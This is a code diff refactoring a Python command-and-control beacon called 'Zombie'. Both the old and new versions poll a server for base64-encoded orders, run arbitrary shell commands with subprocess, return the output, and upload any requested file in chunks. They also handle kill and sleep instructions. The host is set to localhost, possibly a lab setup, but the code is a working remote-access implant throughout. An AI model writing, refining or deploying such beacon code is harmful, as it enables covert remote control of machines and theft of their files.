@@ -1,330 +1,212 @@
 import requests
 import json
 import secrets
-import time
 import base64
 import subprocess
+import time
+import logging
 from os import path
+from typing import Optional, Generator, Iterable
 
 
-class Zombie():
-    id = ""
-    token = ""
-    host = "http://localhost:8080"
-    sleep = ""
-    #proxy = {"http":"http://localhost:8888/"}
-    proxy = {}
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    datefmt='%H:%M:%S'
+)
+logger = logging.getLogger("ZombieBeacon")
 
+class Zombie:
     def __init__(self):
-        self.id = self.gen_id()
+        self.id = secrets.token_hex(10)
+        self.host = "http://localhost:8080"
+        self.sleep = 5
+        self.proxy = {}
+        self.token = ""
+        logger.debug(f"Zombie initialized. ID: {self.id} | Target Host: {self.host}")
 
-    def set_sleep(self,time):
-        self.sleep = time
-        return
-    
-    def get_sleep(self):
-        sleep = int(self.sleep)
-        return sleep
-    
-    def get_host_info():
-        return
-
-    def gen_id(self):
-        id = secrets.token_urlsafe(10)
-        return id
-    
-    def checkin(self):
-        data = '{"X-Client-ID":"'
-        data += f"{self.id}"
-        data += '"}'
-        print(f"CHECKIN => payload to send: {data}")
-        jData = json.loads(data)
-        #req = requests.post("http://localhost:8080/checkin",headers={"Content-Type":"application/json"},data=jData)
-        req = requests.post(f"{self.host}/checkin",json=jData,proxies=self.proxy,headers={'Content-Type':'application/json'},allow_redirects=False)
-        #req = requests.post(f"{self.host}/checkin",json=jData,headers={'Content-Type':'application/json'},allow_redirects=False)
-
-        return req
-
-    def get_data(self):
-        data = '{"X-Client-ID":"'
-        data += f"{self.id}"
-        data += '","Token":"'
-        data += f"{self.get_token()}"
-        data += '"}'
-        print(f"GET_DATA => payload to send: {data}")
-        jData = json.loads(data)
-        resp = requests.get(f"{self.host}/recvFrom",json=jData,headers={'Content-Type':'application/json'},proxies=self.proxy)
-        #resp = requests.get(f"{self.host}/recvFrom",json=jData,headers={'Content-Type':'application/json'})
-        print(f"GET_DATA => Response Status Code: {resp.status_code}")
-        print(f"GET_DATA => Response Content: {resp.content}")
-        payload = resp.content.decode('utf-8')
-        jPayload = json.loads(payload)
-        data = jPayload['data']
-        print(f"GET_DATA => Returning: {data}")
-        return data
-
-    def pagination(self,data:bytes,size:int) -> list:
-        try:
-            l = []
-            print(f"PAGINATION => Recieved {len(data)}")
-            while(len(data) > 0):
-                l.append(data[:size])
-                data = data[size:]
-            return l
-        except:
-            print("PAGINATION => ERROR: Unable to break up string")
-            return []
-    
-    """
-
-    """
-    def grab_chunks(self, file_object, chunk_size=50000):
-        while True:
-            data = file_object.read(chunk_size)
-            if not data:
-                break
-            yield data
-
-    def send_file_chunks(self,data:list):
-        #print(f"SEND_FILE_CHUNKS => Found data: {data}")
-        #print(f"SEND_FILE_CHUNKS => length to send:{(len(toSend)*5000)}")
-        for x in range(0,len(data)):
-            page = x+1
-            if x == (len(data) - 1):
-                page = "END"
-            else:
-                pass
-            toSend = base64.b64encode(data[x])
-            toSend = toSend.decode('utf-8')
-            toSend = f"CHUNK:{toSend}"
-            #print(f"SEND_FILE_CHUNKS => Chunk size: {len(data)}")
-            #Add way to indicate pages
-            payload = '{"X-Client-ID":"'
-            payload += f"{self.id}"
-            payload += '","data":"'
-            payload += f"{toSend}"
-            payload += '","page":"'
-            payload += f"{page}"
-            payload += '"}'
-            #print(f"SEND_FILE => payload before json.loads:{payload}")
-            jpayload = json.loads(payload)
-            print(f"SEND_FILE_CHUNKS => jpayload:{jpayload}")
-            try:
-                #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
-                req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
-            except requests.ConnectionError:
-                print("SEND_FILE_CHUNKS => Couldn't Connect to server")
-                self.sleep = 30
-                req = None
-                return req
-
-
-    def prep_data(self,filename):
-        # try:
-        size = path.getsize(filename)
-        print(f"PREP_DATA => filesize: {size}")
-        if (size > 250000) and (size < 9223372036854775807):
-            if (size > 1073741824):
-                data_list = []
-                with open(filename,'rb') as f:
-                    for chunk in self.grab_chunks(f,chunk_size=500000):
-                        data_list.append(chunk)
-                    f.close()
-                self.send_file_chunks(data_list)
-                return "DONE"
-            else:
-                #logic to break up and send larger chunks of data
-                data_list = []
-                with open(filename,'rb') as f:
-                    for chunk in self.grab_chunks(f):
-                        data_list.append(chunk)
-                    f.close()
-                
-                self.send_file_chunks(data_list)
-                return "DONE"  
-        else:
-            #logic to send smaller files
-            print("PREP_DATA => Found small file")
-            with open(filename,'rb') as f:
-                data = f.read()
-                f.close()
-            data = base64.b64encode(data)
-        # except:
-        #     print("PREP_DATA => Unable to open file for reading")
-        #     data = "ERROR"
-        return data
-
-    def send_file(self,data:bytes):
-        if data == "ERROR":
-            #logic here to not send data 
-            print("SEND_FILE => RECIEVED ERROR!")
-            return
-        elif data == "DONE":
-            #prep_data has already finished sending to server, can return here
-            return
-        else:
-            toSend = self.pagination(data,5000)
-            #print(f"SEND_FILE => toSend chunks:{len(toSend)}")
-            #print(f"SEND_FILE => toSend data:{toSend}")
-            for x in range(0,len(toSend)):
-                #print(f"[???] in FOR LOOP, LEN OF CHUNK: {len(toSend[x])}")
-                page = x+1
-                if x == (len(toSend) - 1):
-                    page = "END"
-                else:
-                    pass
-                #print(f"SEND_FILE => X is: {x}")
-                data = toSend[x]
-                data = "CHUNK:" + data.decode('utf-8')
-                #Add way to indicate pages
-                payload = '{"X-Client-ID":"'
-                payload += f"{self.id}"
-                payload += '","data":"'
-                payload += f"{data}"
-                payload += '","page":"'
-                payload += f"{page}"
-                payload += '"}'
-                #print(f"SEND_FILE => payload before json.loads:{payload}")
-                jpayload = json.loads(payload)
-                #print(f"SEND_FILE => jpayload:{jpayload}")
-                try:
-                    #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
-                    req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
-                except requests.ConnectionError:
-                    print("SEND_FILE => Couldn't Connect to server")
-                    self.sleep = 30
-                    req = None
-                    return req
-            
-    """
-
-    """
-    def read_in_chunks(file_object, chunk_size=5000):
-        while True:
-            data = file_object.read(chunk_size)
-            if not data:
-                break
-            yield data
-
-
-    # with open('really_big_file.dat') as f:
-    #     for piece in read_in_chunks(f):
-    #         process_data(piece)
-            
-    """
-    - Take a byte string, format it in json payload and send to server
-    """
-    def send_data(self,data:bytes,):
-        #Need to add support for larger command outputs (eg find /)
-        if (len(data) > 5000):
-            print(f"SEND_DATA => COMMAND OUTPUT IS OVER 5000, SENDING AS FILE")
-            chunks = self.pagination(data,5000)
-            self.send_file_chunks(chunks)
-            return
-        else:
-            payload = '{"X-Client-ID":"'
-            payload += f"{self.id}"
-            payload += '","data":"'
-            payload += f"{data.decode('utf-8')}"
-            payload += '"}'
-            jpayload = json.loads(payload)
-            print(f"SEND_DATA => jpayload:{jpayload}")
-            try:
-                #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
-                req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
-                return req
-            except requests.ConnectionError:
-                print("SEND_DATA => Couldn't Connect to server")
-                self.sleep = 30
-                req = None
-                return req
-
-    def set_token(self,token):
+    def set_token(self, token: str):
+        logger.debug(f"Updating session token to: {token[:5]}...")
         self.token = token
-        return
-    
-    def get_token(self):
-        return self.token
-    
-"""
- - Parse the data and perform various actions based on whats recieved
-"""
-def process_data(data,zombie:Zombie):
-    split = data.split(":")
-    if split[0] == "CMD":
-        #start another process and run the command
-        cmd = split[1]
-        res = subprocess.run(cmd, capture_output=True,shell=True)
-        payload = b"CMD:"
-        payload += split[1].encode('utf-8')
-        payload += b":OUTPUT:"
-        payload += res.stdout
-        to_send = base64.b64encode(payload)
-        #print(f"PROCESS_DATA => Payload to send to server: {to_send}")
-        zombie.send_data(to_send)
-        time.sleep(zombie.get_sleep())
-    elif split[0] == "KILL":
-        print("PROCESS_DATA => FOUND KILL, EXITING")
-        exit()
-    elif split[0] == "FILE":
-        filename = split[1]
-        print(f"PROCESS_DATA => Filename:{filename}")
-        print("PROCESS_DATA => Recieved command to retrieve file.")
-        # try:
-        data = zombie.prep_data(filename)
-        zombie.send_file(data)
-        return
-        # except:
-        #     print("PROCESS_DATA => ERROR PROCESSING FILE TO SEND")
-        #     return
-    else:
-        print(f"PROCESS_DATA => {split}")
-    return
+
+    def get_token(self) -> str: return self.token
+    def set_sleep(self, t: str):
+        self.sleep = int(t)
+        logger.debug(f"Sleep interval updated to {self.sleep} seconds")
+
+    def get_sleep(self) -> int: return self.sleep
+
+    # Transport layer, handles actual sending
+    # Accepts a chunks generator to itterate over for sending
+    def _transmit(self, chunk_generator: Iterable[bytes], data_type: str, total_size: int) -> bool:
+        logger.debug(f"Starting transmission of {total_size} total bytes")
+
+        bytes_sent = 0
+
+        for index, chunk in enumerate(chunk_generator):
+            chunk_len = len(chunk)
+            bytes_sent += chunk_len
+            b64_data = base64.b64encode(chunk).decode('utf-8')
+
+            # Determine if this is the final chunk based on actual bytes sent
+            is_end = bytes_sent >= total_size
+
+            payload = {
+                "X-Client-ID": self.id,
+                "Token": self.token,
+                "type": f"{data_type}",
+                "data": f"CHUNK_{index}:{b64_data}",
+                "page": "END" if is_end else index + 1
+            }
+
+            try:
+                resp = requests.post(f"{self.host}/sendto", json=payload, proxies=self.proxy, timeout=15)
+                resp.raise_for_status()
+            except requests.RequestException as e:
+                logger.error(f"Transport Error at chunk {index}: {e}")
+                return False
+
+        return True
+
+    def send_binary_data(self, data: bytes):
+        # Sends arbitrary bytes (command output, etc) using the transport layer.
+        data_len = len(data)
+        logger.debug(f"Preparing binary data transmission: {data_len} bytes")
+
+        def memory_chunker():
+            for i in range(0, data_len, 50000):
+                yield data[i : i + 50000]
+
+        return self._transmit(memory_chunker(), "CMD", data_len)
+
+    def upload_file(self, filename: str):
+        # Streams a file from disk to the server.
+        if not path.exists(filename):
+            logger.error(f"File Upload Failed: {filename} does not exist on disk.")
+            return False
+
+        filesize = path.getsize(filename)
+        logger.info(f"Initiating file upload: {filename} ({filesize} bytes)")
+
+        # generator to gather chunks to send
+        def file_chunker():
+            with open(filename, 'rb') as f:
+                while True:
+                    chunk = f.read(50000)
+                    if not chunk: break
+                    yield chunk
+
+        return self._transmit(file_chunker(), "FILE", filesize)
+
+    def checkin(self):
+        payload = {"X-Client-ID": self.id}
+        try:
+            logger.debug("Sending check-in request...")
+            return requests.post(f"{self.host}/checkin", json=payload, proxies=self.proxy,
+timeout=10, allow_redirects=False)
+        except requests.RequestException as e:
+            logger.error(f"Checkin failed to reach server: {e}")
+            return None
+
+    def get_data(self) -> Optional[str]:
+        payload = {"X-Client-ID": self.id, "Token": self.token}
+        try:
+            logger.debug("Requesting pending data/commands from /recvFrom")
+            resp = requests.get(f"{self.host}/recvFrom", json=payload, proxies=self.proxy,
+timeout=10)
+            resp.raise_for_status()
+            data = resp.json().get('data')
+            logger.debug(f"Data received from server. Length: {len(data) if data else 0}")
+            return data
+        except Exception as e:
+            logger.error(f"Error retrieving data: {e}")
+            return None
+
+def process_data(command_str: str, zombie: Zombie):
+    #Parses server commands and executes them.
+    try:
+        # Split only once to avoid errors with commands containing colons
+        split = command_str.split(":", 1)
+        action = split[0]
+
+        if action == "CMD":
+            cmd = split[1]
+            logger.info(f"Executing Command: {cmd}")
+            res = subprocess.run(cmd, capture_output=True, shell=True)
+
+            # Combine stdout and stderr to capture full output
+            combined_output = res.stdout + res.stderr
+            payload = f"CMD:{cmd}:OUTPUT:".encode('utf-8') + combined_output
+
+            logger.debug(f"Command execution finished. Output size: {len(combined_output)} bytes")
+            zombie.send_binary_data(payload)
+
+        elif action == "KILL":
+            logger.warning("Kill signal received from server. Shutting down beacon.")
+            exit()
+
+        elif action == "FILE":
+            filename = split[1]
+            logger.info(f"Server requested file: {filename}")
+            if zombie.upload_file(filename):
+                logger.info(f"File {filename} uploaded successfully.")
+            else:
+                logger.error(f"Failed to upload file {filename}.")
+        elif action == "SLEEP":
+            try:
+                zombie.set_sleep(int(split[1]))
+            except Exception as e:
+                logger.debug(f"Couldn't set sleep timer, value is: {split[1]}, type: {type(split[1])}, error: {e}")
+        else:
+            logger.warning(f"Received unrecognized action from server: {action}")
+    except Exception as e:
+        logger.exception(f"Critical error in process_data loop: {e}")
 
 def main():
     zombie = Zombie()
-    while(True):
-        print("MAIN => Now checking in..")
-        try:
-            req = zombie.checkin()
-        except requests.ConnectionError:
-            print(f"MAIN => Couldn't contact main server...")
-            print("Deep Sleep for 30!")
+    logger.info("Beacon started and entering main loop.")
+
+    while True:
+        req = zombie.checkin()
+
+        if req is None:
+            logger.debug("Server unreachable, retrying in 30s...")
             time.sleep(30)
             continue
-        print(f"MAIN => Response Content:{req.content}")
-        print(f"MAIN => Response Status Code: {req.status_code}")
+
         if req.status_code == 200:
-            content = req.content.decode("utf-8")
-            print(f"MAIN => Content from server: {content}")
-            jContent = json.loads(content)
-            sleep = int(jContent['X-Server-Version'])
-            zombie.set_sleep(sleep)
-            print(f"MAIN => Time to sleep: {sleep}")
-            print("")
-            time.sleep(zombie.get_sleep())
-        elif req.status_code == 302:
-            print("MAIN => Command Found!")
-            print(f"MAIN => Recieved from server: {req.content}")
-            token = req.headers['Token']
-            sleep = req.headers['X-Server-Version']
-            print(f"MAIN => Setting token: {token}")
-            zombie.set_token(token)
-            print(f"MAIN => Setting sleep")
-            zombie.set_sleep(sleep)
-            b64data = zombie.get_data()
-            #Do something with the data here
-            print("MAIN => data found!")
-            print(f"MAIN => b64data: {b64data}")
-            data = base64.b64decode(b64data)
-            data = data.decode('utf-8')
-            process_data(data,zombie)
-            #sleep
+            try:
+                content = req.json()
+                zombie.set_sleep(content.get('X-Server-Version', 5))
+                logger.debug(f"No commands pending. Sleeping for {zombie.get_sleep()}s")
+            except json.JSONDecodeError:
+                logger.error("Server returned status 200 but invalid JSON body.")
             time.sleep(zombie.get_sleep())
 
+        elif req.status_code == 302:
+            logger.info("Redirect (302) received: Command is available.")
+            # Extract metadata from headers
+            zombie.set_token(req.headers.get('Token', ''))
+            zombie.set_sleep(req.headers.get('X-Server-Version', 5))
+
+            b64data = zombie.get_data()
+            if b64data:
+                try:
+                    decoded_cmd = base64.b64decode(b64data).decode('utf-8')
+                    logger.debug(f"Decoded command from server: {decoded_cmd}")
+                    process_data(decoded_cmd, zombie)
+                except Exception as e:
+                    logger.error(f"Failed to decode/execute server command: {e}")
+            else:
+                logger.warning("Server signaled a 302 but /recvFrom returned no data.")
+
+            time.sleep(zombie.get_sleep())
         else:
-            print("MAIN => Didn't get correct status")
+            logger.warning(f"Unexpected server response: HTTP {req.status_code}")
             time.sleep(zombie.get_sleep())
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        logger.info("Beacon stopped by user.")
